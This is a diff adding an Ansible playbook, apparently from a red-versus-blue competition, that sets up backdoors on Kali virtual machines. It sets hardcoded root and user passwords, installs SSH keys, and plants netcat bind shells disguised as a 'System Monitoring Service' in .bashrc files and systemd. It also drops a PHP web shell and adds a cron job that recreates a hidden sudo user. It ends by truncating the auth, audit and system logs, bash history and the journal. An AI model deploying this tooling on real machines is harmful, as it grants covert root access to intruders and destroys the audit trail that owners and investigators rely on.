@@ -1,0 +1,361 @@
+---
+- name: Prepare Kali VMs for Competition
+  hosts: kali_vms
+  gather_facts: no
+  become: yes
+  vars:
+    new_user: "ansibled"
+    new_password: "WinningCDT!"
+    root_password: "WinningCDT1!"
+    ssh_public_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO/wkrXEnmBgWJv5en5IT0UR0HREF78urcK+lNRD5CK7 test@DESKTOP-V1N0U29"
+    persistence_user: "sql.service"
+    persistence_password: "redteamsucks"
+    backdoor_port: 4200
+    bashrc_backdoor_port: 3299
+    webshell_port: 80
+    
+  tasks:
+    - name: Wait for SSH to become available
+      wait_for_connection:
+        timeout: 30
+      ignore_errors: yes
+
+    - name: Create ansibled user
+      user:
+        name: "{{ new_user }}"
+        password: "{{ new_password | password_hash('sha512') }}"
+        shell: /bin/bash
+        createhome: yes
+        state: present
+      register: user_creation
+      ignore_errors: yes
+
+    - name: Update password if user already exists
+      shell: "echo '{{ new_user }}:{{ new_password }}' | chpasswd"
+      when: user_creation is failed
+      no_log: true
+
+    - name: Add user to sudo group
+      user:
+        name: "{{ new_user }}"
+        groups: sudo
+        append: yes
+
+    - name: Create sudoers file for passwordless sudo
+      copy:
+        content: "{{ new_user }} ALL=(ALL) NOPASSWD:ALL\n"
+        dest: "/etc/sudoers.d/{{ new_user }}"
+        mode: '0440'
+        validate: 'visudo -cf %s'
+
+    - name: Set root password
+      shell: "echo 'root:{{ root_password }}' | chpasswd"
+      no_log: true
+
+    - name: Enable root SSH login with password
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?PermitRootLogin'
+        line: 'PermitRootLogin yes'
+        backup: yes
+
+    - name: Enable password authentication
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?PasswordAuthentication'
+        line: 'PasswordAuthentication yes'
+
+    - name: Restart SSH service
+      service:
+        name: "{{ item }}"
+        state: restarted
+      loop:
+        - sshd
+        - ssh
+      ignore_errors: yes
+
+    - name: Create .ssh directory for ansibled user
+      file:
+        path: "/home/{{ new_user }}/.ssh"
+        state: directory
+        mode: '0700'
+        owner: "{{ new_user }}"
+        group: "{{ new_user }}"
+
+    - name: Install SSH key for ansibled user
+      authorized_key:
+        user: "{{ new_user }}"
+        key: "{{ ssh_public_key }}"
+        state: present
+      when: ssh_public_key is defined and ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"
+
+    - name: Create .ssh directory for root
+      file:
+        path: /root/.ssh
+        state: directory
+        mode: '0700'
+        owner: root
+        group: root
+
+    - name: Install SSH key for root
+      authorized_key:
+        user: root
+        key: "{{ ssh_public_key }}"
+        state: present
+      when: ssh_public_key is defined and ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"
+
+    - name: Check if redteam user exists
+      command: id redteam
+      register: redteam_exists
+      ignore_errors: yes
+      changed_when: false
+
+    - name: Create .ssh directory for redteam user
+      file:
+        path: /home/redteam/.ssh
+        state: directory
+        mode: '0700'
+        owner: redteam
+        group: redteam
+      when: redteam_exists.rc == 0
+
+    - name: Install SSH key for redteam user
+      authorized_key:
+        user: redteam
+        key: "{{ ssh_public_key }}"
+        state: present
+      when: 
+        - redteam_exists.rc == 0
+        - ssh_public_key is defined 
+        - ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"
+
+    - name: Add backdoor to redteam .bashrc
+      blockinfile:
+        path: /home/redteam/.bashrc
+        block: |
+          # System monitoring background process
+          (while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done) &
+        marker: "# {mark} ANSIBLE MANAGED BLOCK - System Monitor"
+        create: yes
+        owner: redteam
+        group: redteam
+        mode: '0644'
+      when: redteam_exists.rc == 0
+
+    - name: Add backdoor to root .bashrc
+      blockinfile:
+        path: /root/.bashrc
+        block: |
+          # System monitoring background process
+          (while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done) &
+        marker: "# {mark} ANSIBLE MANAGED BLOCK - System Monitor"
+        create: yes
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Create web shell directory
+      file:
+        path: /var/webserver
+        state: directory
+        mode: '0755'
+        owner: root
+        group: root
+
+    - name: Create PHP web shell
+      copy:
+        content: |
+          <?php system($_REQUEST['cmd']); ?>
+        dest: /var/webserver/monitoring_service.php
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Create web server script
+      copy:
+        content: |
+          #!/bin/bash
+          cd /var/webserver
+          python3 -m http.server {{ webshell_port }} 2>/dev/null
+        dest: /usr/local/bin/start_webserver.sh
+        mode: '0755'
+        owner: root
+        group: root
+
+    - name: Create systemd service for web server
+      copy:
+        content: |
+          [Unit]
+          Description=Web Monitoring Interface
+          After=network.target
+          
+          [Service]
+          Type=simple
+          ExecStart=/usr/local/bin/start_webserver.sh
+          Restart=always
+          RestartSec=3
+          User=root
+          WorkingDirectory=/var/webserver
+          StandardOutput=null
+          StandardError=null
+          
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/web-monitor.service
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Reload systemd daemon for web server
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start web server service
+      systemd:
+        name: web-monitor.service
+        enabled: yes
+        state: started
+
+    - name: Create persistence script
+      copy:
+        content: |
+          #!/bin/bash
+          # Create user if doesn't exist
+          if ! id "{{ persistence_user }}" &>/dev/null; then
+              useradd -m -s /bin/bash "{{ persistence_user }}"
+              echo "{{ persistence_user }}:{{ persistence_password }}" | chpasswd
+              usermod -aG sudo "{{ persistence_user }}"
+              echo "{{ persistence_user }} ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/{{ persistence_user }}
+              chmod 0440 /etc/sudoers.d/{{ persistence_user }}
+          fi
+        dest: /usr/local/bin/create_persistence_user.sh
+        mode: '0755'
+        owner: root
+        group: root
+
+    - name: Create cron job for persistence
+      cron:
+        name: "Create persistence user"
+        minute: "*/2"
+        job: "/usr/local/bin/create_persistence_user.sh"
+        user: root
+        state: present
+
+    - name: Create netcat backdoor script
+      copy:
+        content: |
+          #!/bin/bash
+          while true; do
+              nc -lvnp {{ backdoor_port }} -e /bin/bash 2>/dev/null
+              sleep 1
+          done
+        dest: /usr/local/bin/netcat_backdoor.sh
+        mode: '0755'
+        owner: root
+        group: root
+
+    - name: Create systemd service for netcat backdoor
+      copy:
+        content: |
+          [Unit]
+          Description=System Monitoring Service
+          After=network.target
+          
+          [Service]
+          Type=simple
+          ExecStart=/usr/local/bin/netcat_backdoor.sh
+          Restart=always
+          RestartSec=3
+          User=root
+          StandardOutput=null
+          StandardError=null
+          
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/system-monitor.service
+        mode: '0644'
+        owner: root
+        group: root
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start netcat backdoor service
+      systemd:
+        name: system-monitor.service
+        enabled: yes
+        state: started
+
+    - name: Clear auth logs
+      shell: "truncate -s 0 {{ item }}"
+      with_items:
+        - /var/log/auth.log
+        - /var/log/auth.log.1
+        - /var/log/auth.log.2.gz
+      ignore_errors: yes
+
+    - name: Clear secure logs
+      shell: "truncate -s 0 {{ item }}"
+      with_items:
+        - /var/log/secure
+        - /var/log/secure.1
+      ignore_errors: yes
+
+    - name: Clear syslog
+      shell: "truncate -s 0 {{ item }}"
+      with_items:
+        - /var/log/syslog
+        - /var/log/syslog.1
+      ignore_errors: yes
+
+    - name: Clear messages log
+      shell: "truncate -s 0 {{ item }}"
+      with_items:
+        - /var/log/messages
+        - /var/log/messages.1
+      ignore_errors: yes
+
+    - name: Clear wtmp, btmp, and lastlog
+      shell: "truncate -s 0 {{ item }}"
+      with_items:
+        - /var/log/wtmp
+        - /var/log/btmp
+        - /var/log/lastlog
+      ignore_errors: yes
+
+    - name: Clear kernel logs
+      shell: "truncate -s 0 /var/log/kern.log*"
+      ignore_errors: yes
+
+    - name: Clear daemon logs
+      shell: "truncate -s 0 /var/log/daemon.log*"
+      ignore_errors: yes
+
+    - name: Clear user logs
+      shell: "truncate -s 0 /var/log/user.log*"
+      ignore_errors: yes
+
+    - name: Clear audit logs
+      shell: "truncate -s 0 /var/log/audit/audit.log"
+      ignore_errors: yes
+
+    - name: Clear cloud-init logs
+      shell: "truncate -s 0 /var/log/cloud-init*.log"
+      ignore_errors: yes
+
+    - name: Clear bash history for all users
+      shell: "find /home -name '.bash_history' -exec truncate -s 0 {} \\;"
+      ignore_errors: yes
+
+    - name: Clear root bash history
+      shell: "find /root -name '.bash_history' -exec truncate -s 0 {} \\;"
+      ignore_errors: yes
+
+    - name: Vacuum systemd journal
+      shell: "journalctl --vacuum-time=1s"
+      ignore_errors: yes
+
+    - name: Display completion message
+      debug:
+        msg: "VM {{ inventory_hostname }} prepared successfully!"
